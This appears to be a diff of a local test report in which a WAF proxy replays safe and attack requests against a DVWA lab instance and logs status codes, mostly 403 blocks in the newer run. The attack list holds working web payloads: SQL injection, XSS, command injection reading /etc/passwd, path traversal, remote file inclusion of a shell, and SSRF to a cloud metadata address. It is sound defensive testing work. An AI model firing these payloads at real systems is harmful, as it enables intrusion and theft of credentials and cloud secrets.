@@ -1,12 +1,12 @@
 DVWA WAF replay report
-Generated: 2026-05-30T14:48:48Z
+Generated: 2026-05-30T21:45:22Z
 Root: /Users/sutirtha_05/Desktop/waf-proxy
 WAF target: http://localhost:8080
 Dashboard API: http://localhost:9090/api/admin/requests/count
 DVWA user: admin
 
 Pending count (before):
-{"count":89}
+{"count":0}
 
 DVWA session bootstrap:
   login: ok
@@ -32,17 +32,11 @@ DVWA session bootstrap:
     Location: ../../login.php
     Server: Apache/2.4.10 (Debian)
 [6] URL: http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [7] URL: http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [8] URL: http://localhost:8080/vulnerabilities/sqli_blind/?id=3&Submit=Submit
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [9] URL: http://localhost:8080/vulnerabilities/xss_r/?name=Alice
     Status: HTTP/1.1 302 Found
     Location: ../../login.php
@@ -64,16 +58,11 @@ DVWA session bootstrap:
     Location: ../../login.php
     Server: Apache/2.4.10 (Debian)
 [14] URL: http://localhost:8080/vulnerabilities/brute/?username=admin&password=admin123&Login=Login
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [15] URL: http://localhost:8080/vulnerabilities/weak_id/?Submit=Submit
-    Status: HTTP/1.1 404 Not Found
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [16] URL: http://localhost:8080/vulnerabilities/csrf/?password_new=SafePass%40123&password_conf=SafePass%40123&Change=Change
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [17] URL: http://localhost:8080/favicon.ico
     Status: HTTP/1.1 200 OK
     Server: Apache/2.4.10 (Debian)
@@ -82,39 +71,29 @@ DVWA session bootstrap:
     Server: Apache/2.4.10 (Debian)
 
 SAFE URL HITS pending count delta:
-  before=93
-  after=109
-  delta=16
+  before=3
+  after=13
+  delta=10
 
 ===== ATTACK URL HITS =====
 [1] URL: http://localhost:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [2] URL: http://localhost:8080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2C2--+-&Submit=Submit
     Status: HTTP/1.1 302 Found
     Location: ../../login.php
     Server: Apache/2.4.10 (Debian)
 [3] URL: http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1--+-&Submit=Submit
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [4] URL: http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP%285%29--+-&Submit=Submit
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [5] URL: http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [6] URL: http://localhost:8080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
     Status: HTTP/1.1 302 Found
     Location: ../../login.php
     Server: Apache/2.4.10 (Debian)
 [7] URL: http://localhost:8080/vulnerabilities/csrf/?password_new=NewPass%40123&password_conf=NewPass%40123&Change=Change
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [8] URL: http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bcat+/etc/passwd&Submit=Submit
     Status: HTTP/1.1 302 Found
     Location: ../../login.php
@@ -124,17 +103,11 @@ SAFE URL HITS pending count delta:
     Location: ../../login.php
     Server: Apache/2.4.10 (Debian)
 [10] URL: http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [11] URL: http://localhost:8080/vulnerabilities/fi/?page=../../../../../../windows/win.ini
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [12] URL: http://localhost:8080/vulnerabilities/fi/?page=http://example.com/shell.txt
-    Status: HTTP/1.1 302 Found
-    Location: ../../login.php
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [13] URL: http://localhost:8080/vulnerabilities/brute/?username=admin&password=password&Login=Login
     Status: HTTP/1.1 302 Found
     Location: ../../login.php
@@ -153,25 +126,20 @@ SAFE URL HITS pending count delta:
     Status: HTTP/1.1 404 Not Found
     Server: Apache/2.4.10 (Debian)
 [18] URL: http://localhost:8080/vulnerabilities/open_redirect/?redirect=https%3A%2F%2Fexample.com
-    Status: HTTP/1.1 404 Not Found
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [19] URL: http://localhost:8080/login.php?username=admin%27+OR+%271%27%3D%271&password=test&Login=Login
-    Status: HTTP/1.1 200 OK
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [20] URL: http://localhost:8080/vulnerabilities/spoof/
-    Status: HTTP/1.1 404 Not Found
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [21] URL: http://localhost:8080/vulnerabilities/ssrf/?url=http%3A%2F%2F127.0.0.1
-    Status: HTTP/1.1 404 Not Found
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 [22] URL: http://localhost:8080/vulnerabilities/ssrf/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
-    Status: HTTP/1.1 404 Not Found
-    Server: Apache/2.4.10 (Debian)
+    Status: HTTP/1.1 403 Forbidden
 
 ATTACK URL HITS pending count delta:
-  before=109
-  after=131
-  delta=22
+  before=13
+  after=22
+  delta=9
 
 Pending count (after):
-{"count":131}
+{"count":22}
